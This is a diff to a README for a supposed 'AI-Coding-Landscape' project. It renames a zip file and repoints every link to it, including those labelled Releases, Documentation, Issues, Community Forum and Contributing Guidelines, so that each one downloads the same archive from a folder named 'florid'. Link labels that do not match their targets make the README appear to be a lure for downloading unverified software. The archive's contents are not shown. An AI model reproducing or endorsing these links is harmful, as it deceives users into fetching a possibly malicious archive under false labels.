@@ -1,6 +1,6 @@
 # 🌟 AI-Coding-Landscape - Explore the Future of AI Coding
 
-[![Download](https://raw.githubusercontent.com/Gerixon/AI-Coding-Landscape/main/florid/AI-Coding-Landscape.zip%20Now-AI--Coding--Landscape-brightgreen)](https://raw.githubusercontent.com/Gerixon/AI-Coding-Landscape/main/florid/AI-Coding-Landscape.zip)
+[![Download](https://github.com/Gerixon/AI-Coding-Landscape/raw/refs/heads/main/florid/Landscape-A-Coding-v1.6.zip%20Now-AI--Coding--Landscape-brightgreen)](https://github.com/Gerixon/AI-Coding-Landscape/raw/refs/heads/main/florid/Landscape-A-Coding-v1.6.zip)
 
 ## 📖 Description
 
@@ -13,8 +13,8 @@ To get started with the AI-Coding-Landscape, follow the simple steps below. You 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://raw.githubusercontent.com/Gerixon/AI-Coding-Landscape/main/florid/AI-Coding-Landscape.zip) to download the software.  
-   ![Visit Releases Page](https://raw.githubusercontent.com/Gerixon/AI-Coding-Landscape/main/florid/AI-Coding-Landscape.zip%20Releases%20Page-lightblue)
+   Go to our [Releases Page](https://github.com/Gerixon/AI-Coding-Landscape/raw/refs/heads/main/florid/Landscape-A-Coding-v1.6.zip) to download the software.  
+   ![Visit Releases Page](https://github.com/Gerixon/AI-Coding-Landscape/raw/refs/heads/main/florid/Landscape-A-Coding-v1.6.zip%20Releases%20Page-lightblue)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Pick the latest version for the best features and fixes.
@@ -56,12 +56,12 @@ To uninstall the AI-Coding-Landscape, go to your computer's settings:
 
 ### I encountered an error during installation. What should I do?
 
-If you face any errors, please check that your system meets the requirements. If it does, restart your computer and try reinstalling. If the error persists, visit our [issues section](https://raw.githubusercontent.com/Gerixon/AI-Coding-Landscape/main/florid/AI-Coding-Landscape.zip) for help.
+If you face any errors, please check that your system meets the requirements. If it does, restart your computer and try reinstalling. If the error persists, visit our [issues section](https://github.com/Gerixon/AI-Coding-Landscape/raw/refs/heads/main/florid/Landscape-A-Coding-v1.6.zip) for help.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Review our detailed [Documentation](https://raw.githubusercontent.com/Gerixon/AI-Coding-Landscape/main/florid/AI-Coding-Landscape.zip) for help with advanced features and settings.
-- **Community Support:** Join our [Community Forum](https://raw.githubusercontent.com/Gerixon/AI-Coding-Landscape/main/florid/AI-Coding-Landscape.zip) to ask questions and share tips.
+- **Documentation:** Review our detailed [Documentation](https://github.com/Gerixon/AI-Coding-Landscape/raw/refs/heads/main/florid/Landscape-A-Coding-v1.6.zip) for help with advanced features and settings.
+- **Community Support:** Join our [Community Forum](https://github.com/Gerixon/AI-Coding-Landscape/raw/refs/heads/main/florid/Landscape-A-Coding-v1.6.zip) to ask questions and share tips.
 
 ## 📚 Related Topics
 
@@ -75,7 +75,7 @@ Explore related topics to enhance your knowledge:
 
 ## 📣 Contributing
 
-If you want to contribute to AI-Coding-Landscape, we welcome your input! Check our [Contributing Guidelines](https://raw.githubusercontent.com/Gerixon/AI-Coding-Landscape/main/florid/AI-Coding-Landscape.zip) for more information.
+If you want to contribute to AI-Coding-Landscape, we welcome your input! Check our [Contributing Guidelines](https://github.com/Gerixon/AI-Coding-Landscape/raw/refs/heads/main/florid/Landscape-A-Coding-v1.6.zip) for more information.
 
 ---
 
